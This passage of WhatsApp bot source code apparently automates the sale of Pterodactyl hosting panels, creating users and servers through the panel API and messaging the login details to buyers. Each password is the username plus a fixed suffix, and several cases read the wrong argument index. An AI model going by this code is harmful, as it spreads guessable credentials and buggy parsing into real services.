let u = m.quoted ? m.quoted.sender : t[1] ? t[3].replace(/[^+0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username
let egg = "15"
let loc = "1"
let memo = "22250"
let cpu = "660"
let disk = "22250"
let email = username + "@gmail.com"
let password = username + "83uxxu3"
if (!u) return
let d = (await RezzHost.onWhatsApp(u.split`@`[0]))[0] || {}
let deskripsi = `${hariini}${time} Create By ${pushname}`
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
m.reply(`_Sedang Membuat Server untuk @${u.split`@`[0]} bang @${m?.sender.split('@')[0]}..._`)
let ctf = `
*Hai @${u.split`@`[0]} Ini Data Panel Anda*
*DARI @${m?.sender.split('@')[0]}* `+readmore+`
┏━  ⬣『 *DATA  AKUN*  』⬣  ━┓
┣━━━━━━━━━━━━━━━━━━┓
┃ *Email :* ${email}
┃ *Username :* ${user.username}
┃ *Password :* ${password}
┃ *Ram :* ${memo} MB
┃ *Disk :* ${disk} MB
┃ *CPU :* ${cpu}%
┃ *Created :* ${pushname}
┃ *Hari :* ${hariini}
┃ *Jam :* ${time}
┣━━━━━━━━━━━━━━━━━━┫
┗━━━━━━━━━━━━━━━━━━┛
`+readmore+`
*PROFIT :*
- *BISA GANTI GANTI SC*
- *BOT DAPAT ON 24 JAM*
- *WEB CLOSE BOT ON*
- *GAK BOROS KUOTA*
- *GAK ABISIN RAM HP*
- *GARANSI 15 DAY*

*NOTES :*
- *JAGA BAIK² DATA PANEL ANDA*
- *OWN HANYA MENGIRIM 1X DATA*
- *MASUK GROUP UNTUK INFO*
- *SS PANEL DENGAN CP .DONE*
- *HUB ONW JIKA ADA KENDALA*
- *NO RUN SC DDOS*
- *NO DDOS DOMAIN*
- *NO SEBAR DOMAIN*

*LANGGAR? DI DELETE NO REFF*
`
let msg = generateWAMessageFromContent(from, {
viewOnceMessage: {
message: {
"messageContextInfo": {
"deviceListMetadata": {},
"deviceListMetadataVersion": 2
},
interactiveMessage: proto.Message.InteractiveMessage.create({
body: proto.Message.InteractiveMessage.Body.create({
text: ctf
}),
footer: proto.Message.InteractiveMessage.Footer.create({
text: `THANK YOU FOR ORDERING`
}),
header: proto.Message.InteractiveMessage.Header.create({

title: '',
gifPlayback: true,
subtitle: '',
hasMediaAttachment: true,...(await prepareWAMessageMedia({ image: { url: "https://telegra.ph/file/1203598f29d6839a8f61a.jpg" } }, { upload: RezzHost.waUploadToServer }))
}),
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
buttons: [
{
"name": "cta_url",
"buttonParamsJson": `{"display_text":"👤 CREATED","url":"https://wa.me/${m?.sender.split('@')[0]}?text=Done+bang+panel+nya+normal","merchant_url":"https://www.google.com"}`
}, {
"name": "cta_url",
"buttonParamsJson": `{"display_text":"👥 GROUP BUYER","url":"${global.gr}","merchant_url":"https://www.google.com"}`
}, {
"name": "cta_url",
"buttonParamsJson": `{"display_text":"🌐 LINK LOGIN","url":"${domain}","merchant_url":"https://www.google.com"}`
}, {
"name": "cta_copy",
"buttonParamsJson": JSON.stringify({
"display_text": "📛 COPY USERNAME",
"copy_code": `${user.username}`
})
},
{
"name": "cta_copy",
"buttonParamsJson": JSON.stringify({
"display_text": "🔐 COPY PASSWORD",
"copy_code": `${password}`
})
}
],
}),
contextInfo: {
mentionedJid: [m.sender], 
forwardingScore: 999,
isForwarded: false,
forwardedNewsletterMessageInfo: {
newsletterJid: '120363305511727707@newsletter',
newsletterName: `${ownername}`,
serverMessageId: 145
}
}})}}
}, {quoted: m})
await RezzHost.relayMessage(u, msg.message, {
messageId: msg.key.id
})
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": deskripsi,
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 0,
"backups": 0,
"allocations": 0
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return m.reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await m.reply(`
*Sukses Creat Panel ✅*`+readmore+`
┏━  ⬣『 *DATA  AKUN*  』⬣  ━┓
┣━━━━━━━━━━━━━━━━━━┓
┃ *Email :* ${email}
┃ *Username :* ${user.username}
┃ *ID Server :* ${server.id}
┃ *ID User :* ${user.id}
┃ *Ram :* ${memo} MB
┃ *Disk :* ${disk} MB
┃ *CPU :* ${cpu}%
┃ *Created :* ${pushname}
┃ *Made Today:* ${hariini}
┃ *O'clock :* ${time}
┣━━━━━━━━━━━━━━━━━━┫
┗━━━━━━━━━━━━━━━━━━┛

Username dan Password Telah Dikirim
Ke @${u.split`@`[0]} Bang @${m?.sender.split('@')[0]}`)

}
break
case 'cp23gb': 
case '23gb':
case 'panel23gb': {
if (!isPrem && !isCreator) return reply2(`Fitur Khusus Premium silahkan beli paket premium di owner dengan cara ketik *.owner*`)
let t = text.split(',');
if (t.length < 2) return m.reply(`*Contoh :* ${prefix+command} username,nomer`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[3].replace(/[^+0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username
let egg = "15"
let loc = "1"
let memo = "23250"
let cpu = "690"
let disk = "23250"
let email = username + "@gmail.com"
let password = username + "838c3"
if (!u) return
let d = (await RezzHost.onWhatsApp(u.split`@`[0]))[0] || {}
let deskripsi = `${hariini}${time} Create By ${pushname}`
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
m.reply(`_Sedang Membuat Server untuk @${u.split`@`[0]} bang @${m?.sender.split('@')[0]}..._`)
let ctf = `
*Hai @${u.split`@`[0]} Ini Data Panel Anda*
*DARI @${m?.sender.split('@')[0]}* `+readmore+`
┏━  ⬣『 *DATA  AKUN*  』⬣  ━┓
┣━━━━━━━━━━━━━━━━━━┓
┃ *Email :* ${email}
┃ *Username :* ${user.username}
┃ *Password :* ${password}
┃ *Ram :* ${memo} MB
┃ *Disk :* ${disk} MB
┃ *CPU :* ${cpu}%
┃ *Created :* ${pushname}
┃ *Hari :* ${hariini}
┃ *Jam :* ${time}
┣━━━━━━━━━━━━━━━━━━┫
┗━━━━━━━━━━━━━━━━━━┛
`+readmore+`
*PROFIT :*
- *BISA GANTI GANTI SC*
- *BOT DAPAT ON 24 JAM*
- *WEB CLOSE BOT ON*
- *GAK BOROS KUOTA*
- *GAK ABISIN RAM HP*
- *GARANSI 15 DAY*

*NOTES :*
- *JAGA BAIK² DATA PANEL ANDA*
- *OWN HANYA MENGIRIM 1X DATA*
- *MASUK GROUP UNTUK INFO*
- *SS PANEL DENGAN CP .DONE*
- *HUB ONW JIKA ADA KENDALA*
- *NO RUN SC DDOS*
- *NO DDOS DOMAIN*
- *NO SEBAR DOMAIN*

*LANGGAR? DI DELETE NO REFF*
`
let msg = generateWAMessageFromContent(from, {
viewOnceMessage: {
message: {
"messageContextInfo": {
"deviceListMetadata": {},
"deviceListMetadataVersion": 2
},
interactiveMessage: proto.Message.InteractiveMessage.create({
body: proto.Message.InteractiveMessage.Body.create({
text: ctf
}),
footer: proto.Message.InteractiveMessage.Footer.create({
text: `THANK YOU FOR ORDERING`
}),
header: proto.Message.InteractiveMessage.Header.create({

title: '',
gifPlayback: true,
subtitle: '',
hasMediaAttachment: true,...(await prepareWAMessageMedia({ image: { url: "https://telegra.ph/file/1203598f29d6839a8f61a.jpg" } }, { upload: RezzHost.waUploadToServer }))
}),
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
buttons: [
{
"name": "cta_url",
"buttonParamsJson": `{"display_text":"👤 CREATED","url":"https://wa.me/${m?.sender.split('@')[0]}?text=Done+bang+panel+nya+normal","merchant_url":"https://www.google.com"}`
}, {
"name": "cta_url",
"buttonParamsJson": `{"display_text":"👥 GROUP BUYER","url":"${global.gr}","merchant_url":"https://www.google.com"}`
}, {
"name": "cta_url",
"buttonParamsJson": `{"display_text":"🌐 LINK LOGIN","url":"${domain}","merchant_url":"https://www.google.com"}`
}, {
"name": "cta_copy",
"buttonParamsJson": JSON.stringify({
"display_text": "📛 COPY USERNAME",
"copy_code": `${user.username}`
})
},
{
"name": "cta_copy",
"buttonParamsJson": JSON.stringify({
"display_text": "🔐 COPY PASSWORD",
"copy_code": `${password}`
})
}
],
}),
contextInfo: {
mentionedJid: [m.sender], 
forwardingScore: 999,
isForwarded: false,
forwardedNewsletterMessageInfo: {
newsletterJid: '120363305511727707@newsletter',
newsletterName: `${ownername}`,
serverMessageId: 145
}
}})}}
}, {quoted: m})
await RezzHost.relayMessage(u, msg.message, {
messageId: msg.key.id
})
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": deskripsi,
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 0,
"backups": 0,
"allocations": 0
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return m.reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await m.reply(`
*Sukses Creat Panel ✅*`+readmore+`
┏━  ⬣『 *DATA  AKUN*  』⬣  ━┓
┣━━━━━━━━━━━━━━━━━━┓
┃ *Email :* ${email}
┃ *Username :* ${user.username}
┃ *ID Server :* ${server.id}
┃ *ID User :* ${user.id}
┃ *Ram :* ${memo} MB
┃ *Disk :* ${disk} MB
┃ *CPU :* ${cpu}%
┃ *Created :* ${pushname}
┃ *Made Today:* ${hariini}
┃ *O'clock :* ${time}
┣━━━━━━━━━━━━━━━━━━┫
┗━━━━━━━━━━━━━━━━━━┛

Username dan Password Telah Dikirim
Ke @${u.split`@`[0]} Bang @${m?.sender.split('@')[0]}`)

}
break
case 'cp24gb': 
case '24gb':
case 'panel24gb': {
if (!isPrem && !isCreator) return reply2(`Fitur Khusus Premium silahkan beli paket premium di owner dengan cara ketik *.owner*`)
let t = text.split(',');
if (t.length < 2) return m.reply(`*Contoh :* ${prefix+command} username,nomer`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[3].replace(/[^+0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username
let egg = "15"
let loc = "1"
let memo = "24250"
let cpu = "720"
let disk = "24250"
let email = username + "@gmail.com"
let password = username + "83bd8"
if (!u) return
let d = (await RezzHost.onWhatsApp(u.split`@`[0]))[0] || {}
let deskripsi = `${hariini}${time} Create By ${pushname}`
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
m.reply(`_Sedang Membuat Server untuk @${u.split`@`[0]} bang @${m?.sender.split('@')[0]}..._`)
let ctf = `
*Hai @${u.split`@`[0]} Ini Data Panel Anda*
*DARI @${m?.sender.split('@')[0]}* `+readmore+`
┏━  ⬣『 *DATA  AKUN*  』⬣  ━┓
┣━━━━━━━━━━━━━━━━━━┓
┃ *Email :* ${email}
┃ *Username :* ${user.username}
┃ *Password :* ${password}
┃ *Ram :* ${memo} MB
┃ *Disk :* ${disk} MB
┃ *CPU :* ${cpu}%
┃ *Created :* ${pushname}
┃ *Hari :* ${hariini}
┃ *Jam :* ${time}
┣━━━━━━━━━━━━━━━━━━┫
┗━━━━━━━━━━━━━━━━━━┛
`+readmore+`
*PROFIT :*
- *BISA GANTI GANTI SC*
- *BOT DAPAT ON 24 JAM*
- *WEB CLOSE BOT ON*
- *GAK BOROS KUOTA*
- *GAK ABISIN RAM HP*
- *GARANSI 15 DAY*

*NOTES :*
- *JAGA BAIK² DATA PANEL ANDA*
- *OWN HANYA MENGIRIM 1X DATA*
- *MASUK GROUP UNTUK INFO*
- *SS PANEL DENGAN CP .DONE*
- *HUB ONW JIKA ADA KENDALA*
- *NO RUN SC DDOS*
- *NO DDOS DOMAIN*
- *NO SEBAR DOMAIN*

*LANGGAR? DI DELETE NO REFF*
`
let msg = generateWAMessageFromContent(from, {
viewOnceMessage: {
message: {
"messageContextInfo": {
"deviceListMetadata": {},
"deviceListMetadataVersion": 2
},
interactiveMessage: proto.Message.InteractiveMessage.create({
body: proto.Message.InteractiveMessage.Body.create({
text: ctf
}),
footer: proto.Message.InteractiveMessage.Footer.create({
text: `THANK YOU FOR ORDERING`
}),
header: proto.Message.InteractiveMessage.Header.create({

title: '',
gifPlayback: true,
subtitle: '',
hasMediaAttachment: true,...(await prepareWAMessageMedia({ image: { url: "https://telegra.ph/file/1203598f29d6839a8f61a.jpg" } }, { upload: RezzHost.waUploadToServer }))
}),
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
buttons: [
{
"name": "cta_url",
"buttonParamsJson": `{"display_text":"👤 CREATED","url":"https://wa.me/${m?.sender.split('@')[0]}?text=Done+bang+panel+nya+normal","merchant_url":"https://www.google.com"}`
}, {
"name": "cta_url",
"buttonParamsJson": `{"display_text":"👥 GROUP BUYER","url":"${global.gr}","merchant_url":"https://www.google.com"}`
}, {
"name": "cta_url",
"buttonParamsJson": `{"display_text":"🌐 LINK LOGIN","url":"${domain}","merchant_url":"https://www.google.com"}`
}, {
"name": "cta_copy",
"buttonParamsJson": JSON.stringify({
"display_text": "📛 COPY USERNAME",
"copy_code": `${user.username}`
})
},
{
"name": "cta_copy",
"buttonParamsJson": JSON.stringify({
"display_text": "🔐 COPY PASSWORD",
"copy_code": `${password}`
})
}
],
}),
contextInfo: {
mentionedJid: [m.sender], 
forwardingScore: 999,
isForwarded: false,
forwardedNewsletterMessageInfo: {
newsletterJid: '120363305511727707@newsletter',
newsletterName: `${ownername}`,
serverMessageId: 145
}
}})}}
}, {quoted: m})
await RezzHost.relayMessage(u, msg.message, {
messageId: msg.key.id
})
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": deskripsi,
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 0,
"backups": 0,
"allocations": 0
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return m.reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await m.reply(`
*Sukses Creat Panel ✅*`+readmore+`
┏━  ⬣『 *DATA  AKUN*  』⬣  ━┓
┣━━━━━━━━━━━━━━━━━━┓
┃ *Email :* ${email}
┃ *Username :* ${user.username}
┃ *ID Server :* ${server.id}
┃ *ID User :* ${user.id}
┃ *Ram :* ${memo} MB
┃ *Disk :* ${disk} MB
┃ *CPU :* ${cpu}%
┃ *Created :* ${pushname}
┃ *Made Today:* ${hariini}
┃ *O'clock :* ${time}
┣━━━━━━━━━━━━━━━━━━┫
┗━━━━━━━━━━━━━━━━━━┛

Username dan Password Telah Dikirim
Ke @${u.split`@`[0]} Bang @${m?.sender.split('@')[0]}`)

}
break
case 'cp25gb': 
case '25gb':
case 'panel25gb': {
if (!isPrem && !isCreator) return reply2(`Fitur Khusus Premium silahkan beli paket premium di owner dengan cara ketik *.owner*`)
let t = text.split(',');
if (t.length < 2) return m.reply(`*Contoh :* ${prefix+command} username,nomer`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[3].replace(/[^+0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username
let egg = "15"
let loc = "1"
let memo = "25250"
let cpu = "750"
let disk = "25250"
let email = username + "@gmail.com"
let password = username + "8nenx8"
if (!u) return
let d = (await RezzHost.onWhatsApp(u.split`@`[0]))[0] || {}
let deskripsi = `${hariini}${time} Create By ${pushname}`
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
m.reply(`_Sedang Membuat Server untuk @${u.split`@`[0]} bang @${m?.sender.split('@')[0]}..._`)
let ctf = `
*Hai @${u.split`@`[0]} Ini Data Panel Anda*
*DARI @${m?.sender.split('@')[0]}* `+readmore+`
┏━  ⬣『 *DATA  AKUN*  』⬣  ━┓
┣━━━━━━━━━━━━━━━━━━┓
┃ *Email :* ${email}
┃ *Username :* ${user.username}
┃ *Password :* ${password}
┃ *Ram :* ${memo} MB
┃ *Disk :* ${disk} MB
┃ *CPU :* ${cpu}%
┃ *Created :* ${pushname}
┃ *Hari :* ${hariini}
┃ *Jam :* ${time}
┣━━━━━━━━━━━━━━━━━━┫
┗━━━━━━━━━━━━━━━━━━┛
`+readmore+`
*PROFIT :*
- *BISA GANTI GANTI SC*
- *BOT DAPAT ON 24 JAM*
- *WEB CLOSE BOT ON*
- *GAK BOROS KUOTA*
- *GAK ABISIN RAM HP*
- *GARANSI 15 DAY*

*NOTES :*
- *JAGA BAIK² DATA PANEL ANDA*
- *OWN HANYA MENGIRIM 1X DATA*
- *MASUK GROUP UNTUK INFO*
- *SS PANEL DENGAN CP .DONE*
- *HUB ONW JIKA ADA KENDALA*
- *NO RUN SC DDOS*
- *NO DDOS DOMAIN*
- *NO SEBAR DOMAIN*

*LANGGAR? DI DELETE NO REFF*
`
let msg = generateWAMessageFromContent(from, {
viewOnceMessage: {
message: {
"messageContextInfo": {
"deviceListMetadata": {},
"deviceListMetadataVersion": 2
},
interactiveMessage: proto.Message.InteractiveMessage.create({
body: proto.Message.InteractiveMessage.Body.create({
text: ctf
}),
footer: proto.Message.InteractiveMessage.Footer.create({
text: `THANK YOU FOR ORDERING`
}),
header: proto.Message.InteractiveMessage.Header.create({

title: '',
gifPlayback: true,
subtitle: '',
hasMediaAttachment: true,...(await prepareWAMessageMedia({ image: { url: "https://telegra.ph/file/1203598f29d6839a8f61a.jpg" } }, { upload: RezzHost.waUploadToServer }))
}),
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
buttons: [
{
"name": "cta_url",
"buttonParamsJson": `{"display_text":"👤 CREATED","url":"https://wa.me/${m?.sender.split('@')[0]}?text=Done+bang+panel+nya+normal","merchant_url":"https://www.google.com"}`
}, {
"name": "cta_url",
"buttonParamsJson": `{"display_text":"👥 GROUP BUYER","url":"${global.gr}","merchant_url":"https://www.google.com"}`
}, {
"name": "cta_url",
"buttonParamsJson": `{"display_text":"🌐 LINK LOGIN","url":"${domain}","merchant_url":"https://www.google.com"}`
}, {
"name": "cta_copy",
"buttonParamsJson": JSON.stringify({
"display_text": "📛 COPY USERNAME",
"copy_code": `${user.username}`
})
},
{
"name": "cta_copy",
"buttonParamsJson": JSON.stringify({
"display_text": "🔐 COPY PASSWORD",
"copy_code": `${password}`
})
}
],
}),
contextInfo: {
mentionedJid: [m.sender], 
forwardingScore: 999,
isForwarded: false,
forwardedNewsletterMessageInfo: {
newsletterJid: '120363305511727707@newsletter',
newsletterName: `${ownername}`,
serverMessageId: 145
}
}})}}
}, {quoted: m})
await RezzHost.relayMessage(u, msg.message, {
messageId: msg.key.id
})
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": deskripsi,
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 0,
"backups": 0,
"allocations": 0
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return m.reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await m.reply(`
*Sukses Creat Panel ✅*`+readmore+`
┏━  ⬣『 *DATA  AKUN*  』⬣  ━┓
┣━━━━━━━━━━━━━━━━━━┓
┃ *Email :* ${email}
┃ *Username :* ${user.username}
┃ *ID Server :* ${server.id}
┃ *ID User :* ${user.id}
┃ *Ram :* ${memo} MB
┃ *Disk :* ${disk} MB
┃ *CPU :* ${cpu}%
┃ *Created :* ${pushname}
┃ *Made Today:* ${hariini}
┃ *O'clock :* ${time}
┣━━━━━━━━━━━━━━━━━━┫
┗━━━━━━━━━━━━━━━━━━┛

Username dan Password Telah Dikirim
Ke @${u.split`@`[0]} Bang @${m?.sender.split('@')[0]}`)

}
break

case 'cpunliall':
case 'unliall':
case 'panelunli': {
if (!isPrem && !isCreator) return reply2(`Fitur Khusus Premium silahkan beli paket premium di owner dengan cara ketik *.owner*`)
let t = text.split(',');
if (t.length < 2) return m.reply(`*Contoh :* ${prefix+command} username,nomer`)
let username = t[0];
let u = m.quoted ? m.quoted.sender: t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net': m.mentionedJid[0];
let name = username
let egg = "15"
let loc = "1"
let memo = "0"
let cpu = "0"
let disk = "0"
let email = username + "@gmail.com"
let password = username + "274h8"
if (!u) return
let d = (await RezzHost.onWhatsApp(u.split`@`[0]))[0] || {}
let deskripsi = `${hariini}${time} Create By ${pushname}`
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
m.reply(`_Sedang Membuat Server untuk @${u.split`@`[0]} bang @${m?.sender.split('@')[0]}..._`)
let ctf = `
*Hai @${u.split`@`[0]} Ini Data Panel Anda*
*DARI @${m?.sender.split('@')[0]}* `+readmore+`
┏━  ⬣『 *DATA  AKUN*  』⬣  ━┓
┣━━━━━━━━━━━━━━━━━━┓
┃ *Email :* ${email}
┃ *Username :* ${user.username}
┃ *Password :* ${password}
┃ *Ram :* ${memo} MB
┃ *Disk :* ${disk} MB
┃ *CPU :* ${cpu}%
┃ *Created :* ${pushname}
┃ *Hari :* ${hariini}
┃ *Jam :* ${time}
┣━━━━━━━━━━━━━━━━━━┫
┗━━━━━━━━━━━━━━━━━━┛
`+readmore+`
*PROFIT :*
- *BISA GANTI GANTI SC*
- *BOT DAPAT ON 24 JAM*
- *WEB CLOSE BOT ON*
- *GAK BOROS KUOTA*
- *GAK ABISIN RAM HP*
- *GARANSI 15 DAY*

*NOTES :*
- *JAGA BAIK² DATA PANEL ANDA*
- *OWN HANYA MENGIRIM 1X DATA*
- *MASUK GROUP UNTUK INFO*
- *SS PANEL DENGAN CP .DONE*
- *HUB ONW JIKA ADA KENDALA*
- *NO RUN SC DDOS*
- *NO DDOS DOMAIN*
- *NO SEBAR DOMAIN*

*LANGGAR? DI DELETE NO REFF*
`
let msg = generateWAMessageFromContent(from, {
viewOnceMessage: {
message: {
"messageContextInfo": {
"deviceListMetadata": {},
"deviceListMetadataVersion": 2
},
interactiveMessage: proto.Message.InteractiveMessage.create({
body: proto.Message.InteractiveMessage.Body.create({
text: ctf
}),
footer: proto.Message.InteractiveMessage.Footer.create({
text: `THANK YOU FOR ORDERING`
}),
header: proto.Message.InteractiveMessage.Header.create({

title: '',
gifPlayback: true,
subtitle: '',
hasMediaAttachment: true,...(await prepareWAMessageMedia({ image: { url: "https://telegra.ph/file/1203598f29d6839a8f61a.jpg" } }, { upload: RezzHost.waUploadToServer }))
}),
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
buttons: [
{
"name": "cta_url",
"buttonParamsJson": `{"display_text":"👤 CREATED","url":"https://wa.me/${m?.sender.split('@')[0]}?text=Done+bang+panel+nya+normal","merchant_url":"https://www.google.com"}`
}, {
"name": "cta_url",
"buttonParamsJson": `{"display_text":"👥 GROUP BUYER","url":"${global.gr}","merchant_url":"https://www.google.com"}`
}, {
"name": "cta_url",
"buttonParamsJson": `{"display_text":"🌐 LINK LOGIN","url":"${domain}","merchant_url":"https://www.google.com"}`
}, {
"name": "cta_copy",
"buttonParamsJson": JSON.stringify({
"display_text": "📛 COPY USERNAME",
"copy_code": `${user.username}`
})
},
{
"name": "cta_copy",
"buttonParamsJson": JSON.stringify({
"display_text": "🔐 COPY PASSWORD",
"copy_code": `${password}`
})
}
],
}),
contextInfo: {
mentionedJid: [m.sender], 
forwardingScore: 999,
isForwarded: false,
forwardedNewsletterMessageInfo: {
newsletterJid: '120363305511727707@newsletter',
newsletterName: `${ownername}`,
serverMessageId: 145
}
}})}}
}, {quoted: m})
await RezzHost.relayMessage(u, msg.message, {
messageId: msg.key.id
})
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": deskripsi,
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 0,
"backups": 0,
"allocations": 0
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return m.reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await m.reply(`
*Sukses Creat Panel ✅*`+readmore+`
┏━  ⬣『 *DATA  AKUN*  』⬣  ━┓
┣━━━━━━━━━━━━━━━━━━┓
┃ *Email :* ${email}
┃ *Username :* ${user.username}
┃ *ID Server :* ${server.id}
┃ *ID User :* ${user.id}
┃ *Ram :* ${memo} MB
┃ *Disk :* ${disk} MB
┃ *CPU :* ${cpu}%
┃ *Created :* ${pushname}
┃ *Made Today:* ${hariini}
┃ *O'clock :* ${time}
┣━━━━━━━━━━━━━━━━━━┫
┗━━━━━━━━━━━━━━━━━━┛

Username dan Password Telah Dikirim
Ke @${u.split`@`[0]} Bang @${m?.sender.split('@')[0]}`)

}
break
case 'addadmin':
case 'cadmin':
case 'buatadmin':
case 'addpt':
case 'addownpt': {
if (!isCreator) return reply2(`Kau ni ape kau tinggal sini ke`)
let t = text.split(',');
